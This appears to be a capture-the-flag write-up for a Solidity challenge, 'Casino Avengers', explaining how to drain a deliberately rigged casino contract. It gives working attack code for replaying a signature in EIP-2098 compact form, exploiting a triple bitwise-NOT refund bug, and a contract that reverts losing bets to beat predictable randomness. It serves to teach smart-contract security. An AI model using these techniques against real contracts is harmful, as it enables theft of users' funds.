# Casino Avengers

## Author

ustas.eth

## Description

After numerous attacks by Alice on Bob, he's now planning his revenge. By tracing his stolen funds, Bob has uncovered
Alice's latest scheme: a rigged Casino smart contract.
You and Bob have a long history together. While Bob may not be an expert in hacking, he has turned to his most trusted
ally - you - for assistance. Although the funds are already locked in the contract and it seems impossible to retrieve
them, as a team you are determined to find a way...

## Solution

### Step 1:

Find the original signature used for *pause*, it is of *length 65 bytes*, convert it
to [Compact Signature Representation](https://eips.ethereum.org/EIPS/eip-2098), it is still valid signature.
Once you have the new signature, call `pause(compactSignature, sameSalt)` to unpause the Casino.

```solidity
function convertSignatureToCompact(bytes memory signature) public pure returns (bytes memory) {
    require(signature.length == 65, "Invalid signature length - must be 65 bytes");

    // First, we'll extract r, s, and v from the 65-byte signature
    bytes32 r;
    bytes32 s;
    uint8 v;

    // Extract the components using assembly, just like in the OpenZeppelin code
    assembly {
    // The first 32 bytes after the length prefix (0x20) contain r
        r := mload(add(signature, 0x20))
    // The next 32 bytes contain s
        s := mload(add(signature, 0x40))
    // The last byte contains v
        v := byte(0, mload(add(signature, 0x60)))
    }

    // Validate that v is either 27 or 28
    require(v == 27 || v == 28, "Invalid v value - must be 27 or 28");

    // Create the compressed 'vs' value by potentially setting the highest bit
    // If v is 28, we set the highest bit of s to 1
    // If v is 27, we leave s as is
    bytes32 vs = v == 28
        ? bytes32(uint256(s) | (1 << 255))  // Set the highest bit
        : bytes32(uint256(s));              // Leave as is

    // Combine r and the modified vs into a 64-byte signature
    return abi.encodePacked(r, vs);
}
```

Now you might think we can *withdraw* out funds; you are wrong; the `_withdraw` function has a *typo* and nobody can
withdraw their funds.

```solidity
function _withdraw(address withdrawer, address receiver, uint256 amount) internal whenNotPaused {
    //...
    reciever.call{value: amount}(""); // <<< wrong spelling of [reciever]
}
```

### Step 2:

As the *player* deposit *0.1 ether* into the casino to start playing.

### Step 3:

We take advantage of another *clever* bug that was put into the *reset* function.
This line of code `uint256 balance = ~~~balances[holder]; // optimization trick` is interesting, the triple *bitwise
NOT* will just flip the balance bits.

1. `~balance` flip all bits.
2. `~~balance` flip all bits twice, bringing it back to int original value.
3. `~~~balance` flip all bits three times, resulting in flipped balance.

So if you have *1 ether*, the contract will try to refund you with `type(uint256).max - 1 ether`.

All we have to do is to *kep betting* until our balance is the flipped value of the *Casino* total balance.

```solidity
function reset(
    bytes memory signature,
    address payable receiver,
    uint256 amount,
    bytes32 salt
) external {
    //...
    for (uint256 h = 0; h < holderslen; h++) {
        address holder = holders[h];
        uint256 balance = ~~~balances[holder]; // optimization trick
        balances[holder] = 0;
        holder.call{value: balance}("");
    }
    //...
}
```

```bash
➜ uint balance = 1 ether;
➜ uint balanceFlipped = ~~~balance;

➜ balance
Type: uint256
├ Hex: 0xde0b6b3a7640000
├ Hex (full word): 0xde0b6b3a7640000
└ Decimal: 1000000000000000000
➜ balanceFlipped
Type: uint256
├ Hex: 0xfffffffffffffffffffffffffffffffffffffffffffffffff21f494c589bffff
├ Hex (full word): 0xfffffffffffffffffffffffffffffffffffffffffffffffff21f494c589bffff
└ Decimal: 115792089237316195423570985008687907853269984665640564039456584007913129639935
```

### Step 4:

Start betting, but be smart about it, the way *Casino* determine winners is not very random because the input parameters
are known and can be controlled by the caller.

```solidity
uint256 random = uint256(keccak256(abi.encode(gasleft(), block.number, totalBets)));
bool win = random % 2 == 1;
```

You can make *PlayerBettingContract* that will *ALWAYS* win.

```solidity
contract PlayerBetterContract {
    function bet(Casino casino) {
        bool win = casino.bet(casino.balances(address(this)));
        if (!win) {
            revert("I changed my mind ;)");
        }
    }
}
```

Make a script that calls you *PlayerBetterContract*, and change the gas if it reverts. This can be done using
*JavaScript*; which I have no pleasure in explaining or writing; but you get the idea.

### Step 5:

Once you have *~~~address(Casino).balance*, go ahead and call *reset* with the compact signature.

```solidity
bytes memory resetSig = convertSignatureToCompact(resetSignature);
ca.reset(resetSig, payable(resetReceiver), resetValue, resetSalt);
```
